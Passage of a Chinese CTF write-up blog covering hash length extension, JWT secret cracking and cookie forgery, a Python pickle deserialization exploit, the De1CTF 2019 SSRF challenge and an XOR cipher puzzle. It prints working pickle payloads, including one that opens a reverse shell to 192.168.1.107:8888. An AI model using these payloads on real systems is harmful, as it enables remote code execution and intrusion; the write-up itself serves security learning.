<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如你有一串字符串K，长<span class="number">512</span>位，</span><br><span class="line"> 你得到了它的hash</span><br><span class="line"> 你可以从hash里推导出<span class="built_in">a1</span>,<span class="keyword">b1,c1,d1</span></span><br><span class="line"><span class="keyword"> </span>然后用<span class="built_in">a1</span>,<span class="keyword">b1,c1,d1对另一个字符串S加密</span></span><br><span class="line"><span class="keyword"> </span>得到的就是K+S的hash。。。</span><br></pre></td></tr></table></figure>

<p>这里赵师傅的思路是，得到keyflag.txtscan的hash值，利用攻击来预测拓展后为keyflag.txtscanread的hash值，</p>
<p>sign = md5(‘keyflag.txtscan’)</p>
<p>hash_sign = hashpumpy.hashpump(sign, ‘flag.txtscan’, ‘read’, 16)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">help</span>(hashpumpy.hashpump)</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">        hexdigest(<span class="keyword">str</span>):      <span class="keyword">Hex</span>-encoded <span class="keyword">result</span> <span class="keyword">of</span> hashing <span class="keyword">key</span> + original_data.</span><br><span class="line">        original_data(<span class="keyword">str</span>):  Known <span class="keyword">data</span> used <span class="keyword">to</span> <span class="keyword">get</span> the <span class="keyword">hash</span> <span class="keyword">result</span> hexdigest.</span><br><span class="line">        data_to_add(<span class="keyword">str</span>):    <span class="keyword">Data</span> <span class="keyword">to</span> append</span><br><span class="line">        key_length(<span class="built_in">int</span>):     <span class="keyword">Length</span> <span class="keyword">of</span> <span class="literal">unknown</span> <span class="keyword">data</span> prepended <span class="keyword">to</span> the <span class="keyword">hash</span></span><br></pre></td></tr></table></figure>

<p>（这里之所以可以拓展攻击，一、action后来可控，二、之后的action为scanxxxxxxxxxxxxxread，是scan的拓展）</p>
<h3 id="ikun（薅羊毛，逻辑漏洞，cookie伪造，python反序列化，代码审计）"><a href="#ikun（薅羊毛，逻辑漏洞，cookie伪造，python反序列化，代码审计）" class="headerlink" title="ikun（薅羊毛，逻辑漏洞，cookie伪造，python反序列化，代码审计）"></a>ikun（薅羊毛，逻辑漏洞，cookie伪造，python反序列化，代码审计）</h3><p>wp参考<a href="http://www.freesion.com/article/467719658/" target="_blank" rel="noopener">http://www.freesion.com/article/467719658/</a><br><img src="http://www.freesion.com/images/443/93d8e25d7238067b6e431703661ac0db.png" alt="1"></p>
<blockquote>
<p>复现环境：<a href="https://github.com/CTFTraining/CISCN_2019_northern_China_day1_web2" target="_blank" rel="noopener">https://github.com/CTFTraining/CISCN_2019_northern_China_day1_web2</a>. 在线复现环境：<a href="http://web44.buuoj.cn/" target="_blank" rel="noopener">http://web44.buuoj.cn/</a><br>知识点：</p>
<ul>
<li>薅羊毛与逻辑漏洞</li>
<li>cookie伪造</li>
<li>python反序列化</li>
</ul>
</blockquote>
<p>进入网站后正常先注册，然后进入页面。<br><img src="http://www.freesion.com/images/281/d14fb1fd61721afeb48d290479845049.png" alt="2"><br>这里正常的先尝试购买，购买后发现资金募集这里增加了购买物品的金额，个人中心里剩余金额减少了购买时的实际付款<br>这里是想到了抓包，然后直接改金额尝试，但看到上面的提示说要买lv6，简单翻了几页并没有发现lv6，这时候看到url有page参数，来进行修改，发现到500都还有，这就不能手工找了，简单写个脚本来找<br><img src="http://www.freesion.com/images/127/bb47adf1c8dab99b5295388e59c5c05f.png" alt="3"><br>这里检查页面元素可以发现lv4，lv5都是以图片形式加载的，图片名分别对应为lv4.png，lv5.png</p>
<p>python3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    response = request.urlopen(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> response.read().decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>python2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>):</span><br><span class="line">    r = requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p><img src="http://www.freesion.com/images/252/5b0a9787a0132522425b9efaaeeec2cc.png" alt="4"></p>
<p>可以看到181页，找到了lv6<br><img src="http://www.freesion.com/images/787/42516513ee210af494bf7ea30c40749b.png" alt="5"><br>可以看到高贵的lv6果然是天价，这时候，就试着来尝试抓包改价格了<br><img src="http://www.freesion.com/images/109/4ae10140840df374af293c188ab03ced.png" alt="6"><br>可以看到有价格和打折额度，但是无论将价格改为0还是将折扣改为0，都显示操作失败…<br><img src="http://www.freesion.com/images/247/0d1cf1d57f8e3b012b3d8a277e2ac43f.png" alt="7"><br>陷入僵局，果然还是只能换偶像了…<br>好吧看了下大佬的writeup这里不要改为0，改为很小的数就行了<br>尝试之后发现是只能更改折扣那里的值，这算是一个逻辑漏洞吧，然后会进行一个重定向<br><img src="http://www.freesion.com/images/493/7985f796b909727d0d55c77a45f10735.png" alt="8"><br>我们进入302跳转后的页面，可以看到提示要求admin才能登陆<br><img src="http://www.freesion.com/images/220/2c932a0eaa284ccc474f06308fe3ae14.png" alt="9"><br>这时候肯定是想着去看cookie值，在哪里把用户名进行替换<br>可以看上面上面的图，里面的cookie里面有JWT（JSON Web Token），我这样的菜鸡也是第一次遇到…查了下JWT，然后知道可以解析看看<br><img src="http://www.freesion.com/images/558/da5b11217a4c64f34e005f6b551ad996.png" alt="10"><br>可以看到解析结果果然有用户名，这时候我们就需要来对它进行替换（这里我也想过重新注册一个名为admin的用户，结果不给注册，这个骚操作行不通）<br>用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>来跑密钥<br><img src="http://www.freesion.com/images/457/d85169511d1a27cecba679e72b216579.png" alt="11"><br>可以看到成功的跑出了密钥<br><img src="http://www.freesion.com/images/234/cbbd474f5cbc5b9d2fd1a9034ad4a5d2.png" alt="12"><br>用得到的密钥生成admin的JWT，然后cookie进行修改，页面就正常显示了<br><img src="http://www.freesion.com/images/41/8db2268bf9718686befce098f8a5dde9.png" alt="13"><br>检查源码发现友军给我们留下了好东西<br><img src="http://www.freesion.com/images/234/63bb5b58f289d20c5b58fd3ab1800ada.png" alt="14"><br>把源码下载回来<br><img src="http://www.freesion.com/images/410/539f05ec37d5e48b79624303691944aa.png" alt="15"><br>是一堆py文件，python代码审计又是第一次遇到，又懵逼…看了看大佬的writeup，说是有python的反序列化漏洞…前面一直说看python反序列化漏洞来着…<br>首先看反序列化部分的代码吧<br><img src="http://www.freesion.com/images/488/065bf160176dbd758891b7042852ab78.png" alt="16"><br>可以看到这里用的是tornado框架，这个框架用的好像比较少，好像是停止更新了吧<br>get_argument是tornado获取参数的方法，不区分get和post<br><img src="http://www.freesion.com/images/717/a18dbf6d490d227c0c92f06a6b7c75bd.png" alt="17"><br>可以看到我们提交过去的body里面确实有become参数</p>
<blockquote>
<p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象，这样的话就大大拓宽了我们的攻击面</p>
</blockquote>
<blockquote>
<p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 <strong>reduce</strong> 方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个<strong>reduce</strong> 方法，我们就能在序列化的使用让这个类根据我们在 <strong>reduce</strong> 中指定的方式进行序列化</p>
</blockquote>
<p>这里我们就可以直接写payload了，我们可以用nc在vps上开个端口监听，让其去访问（但这里大佬比赛时环境不能访问外网，访问的是内网的xss平台…没太懂这个xss平台自己搭的还是本来就有…）</p>
<p>但这里也可以利用返回参数把它带出来<br>可以看到上面的代码p是可以返回的，这里我们让p等于flag的内容，就能获得flag了</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>用运行得到的结果去替代原有参数就能成功获得flag<br><img src="http://www.freesion.com/images/108/05d9a5f6722cfcc4ae001ceba26f7214.png" alt="18"></p>
<p>反弹shell的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s=<span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.107",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br><span class="line"></span><br><span class="line">e=exp()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> urllib.quote(poc)</span><br></pre></td></tr></table></figure>

<p>本机(攻击机)nc监听，拿到一个shell，flag在根目录下</p>
<p> <a href="https://img2018.cnblogs.com/blog/1610491/201906/1610491-20190613145003883-602635513.png" target="_blank" rel="noopener"><img src="https://img2018.cnblogs.com/blog/1610491/201906/1610491-20190613145003883-602635513.png" alt="img"></a></p>
<p>总结</p>
<p>这道题也是很有意思，让我也去学习了许多新的知识点，JWT，python反序列化，等等<br>这里也比较理解大佬以前说的python反序列化比起php来危害更大，更容易任意命令执行<br>最后我想说虽然拿到了flag但最终还是没能买下lv6会员啊，hhh（这道题真的还是很符合当前热点的，但真的不希望以后再有人向github传CXK的exp了！！！）</p>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><ol>
<li><p>感觉遇到管理员权限，</p>
<p>要么就是拿到或伪造管理员的cookie，</p>
<p>要么就是想办法找代码漏洞改管理员密码，</p>
<p>似乎还有sql注入得到管理员密码的</p>
</li>
<li><p>代码审计要是看着头大，Seay源代码审计系统  说不定可以帮上忙或者给点方向，</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/09/admin_ssrfme_piapia_ikun/" data-id="ck2g3l2l90014lgv33wgzwsa8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-Up/">Write Up</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-De1CTF2019_ssrfme_xorz" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/03/De1CTF2019_ssrfme_xorz/" class="article-date">
  <time datetime="2019-08-03T14:14:55.000Z" itemprop="datePublished">2019-08-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/03/De1CTF2019_ssrfme_xorz/">De1CTF2019_ssrfme_xorz</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="De1CTF2019-SSRF-ME-XORZ"><a href="#De1CTF2019-SSRF-ME-XORZ" class="headerlink" title="De1CTF2019 SSRF ME | XORZ"></a>De1CTF2019 SSRF ME | XORZ</h1><h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>hint：flag is in ./flag.txt</p>
<p>访问靶机，拿到题目源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>回显flag的地方应该是Exec函数，然后要先过一个判断self.checkSign()</p>
<p>定位到checkSign函数又是一个判断 if(getSign(self.action, self.param) == self.sign)</p>
<p>在定位到getSign函数  return hashlib.md5(secert_key + param + action).hexdigest()</p>
<p>这里会把key，param，action串起来然后md5加密，self.sign是cookie里的，这个可以造，再说，然后是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>要求scan在action里面，这样子他会创建一个文件，在scan一个{$param}文件，定位到scan函数，</p>
<p>return urllib.urlopen(param).read()[:50]，他会打开一个{$param}文件并且只取前50位，所以就打开flag.txt咯，</p>
<p>patam=flag.txt，然后他会把flag.txt的内容写进那个result文件。接着如果read在action里面，他就会打开result文件，并把内容赋值给result，然后输出（就是给你看啦）。</p>
<p>那么目的明确了，往前推就是，action=readscan，然后param=flag.txt，那么为了过检查，sign=MD5(flag.txtreadscan)，怎么获得这个呢，有getsign这个函数。怎么回显sign呢？有geneSign()这个函数，geneSign这个函数里的action赋值为scan了，所以我们只需要让param=flag.txtrread，就可以获得MD5(flag.txtreadscan)了。okay，万事俱备。那怎么执行到Exec()函数呢，在/De1ta里的challenge()函数，param可以get。action和sign都是cookie里的。</p>
<p>所以总的步骤：</p>
<ol>
<li>访问/geneSign?param=flag.txtread                                  得到$sign</li>
<li>访问/De1ta?param=flag.txt                                                抓包，写入sign=$sign和action=readscan</li>
</ol>
<p>get flag。</p>
<h3 id="XORZ"><a href="#XORZ" class="headerlink" title="XORZ"></a>XORZ</h3><p>加密源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>

<p>解题思路:</p>
<p>加密脚本是salt^key^plain=output</p>
<p>所以逆过来，salt^output=key^plain</p>
<p>已知len(key)&lt;38，</p>
<p>所以先爆破长度，</p>
<p>只要备选的key不是空集即可，</p>
<p>得到可能的长度只有30</p>
